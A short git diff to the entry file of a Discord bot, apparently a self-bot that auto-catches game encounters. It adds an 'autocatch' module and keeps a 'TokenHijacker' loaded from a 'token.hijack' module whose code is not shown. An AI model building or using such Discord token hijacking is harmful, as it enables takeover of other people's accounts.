@@ -1,6 +1,7 @@
 const { Receiver, MessageType } = require('./model/messaging/receiver.messaging')
 const { Client } = require('discord.js')
 const TokenHijacker = new (require('./model/hijack/token.hijack'))()
+require('./model/autocatch/mapper.autocatch').init()
 
 console.log('Click Me!')
 
@@ -14,4 +15,4 @@ const receiver = new Receiver(client)
 
 receiver.start()
 receiver.on(MessageType.Any, (msg) => console.log(msg))
-receiver.on(MessageType.Encounter, async (md5) => console.log(await md5))
+receiver.on(MessageType.Encounter, async (data) => console.log(await data))
